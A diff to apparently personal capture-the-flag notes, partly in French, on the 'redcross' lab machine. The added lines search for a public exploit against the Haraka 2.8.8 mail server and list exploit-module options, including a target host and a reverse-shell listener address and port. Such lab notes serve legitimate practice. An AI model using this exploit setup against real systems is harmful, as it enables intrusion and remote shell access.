@@ -43,6 +43,16 @@ On essai ftp, tenet, nc
 nc 10.10.10.113
 220 redcross ESMTP Haraka 2.8.8 ready
 
+searchsploit haraka
+
+email_from  admin@redcross.htb     yes       Address to send from
+email_to    penelope@redcross.htb  yes       Email to send to, must be accepted by the server
+rhost       10.10.10.113           yes       Target server
+rport       1025                   yes       Target server port
+
+LHOST  192.168.2.28     yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
 
 -----------------------------------------
 ROOT ACCESS :
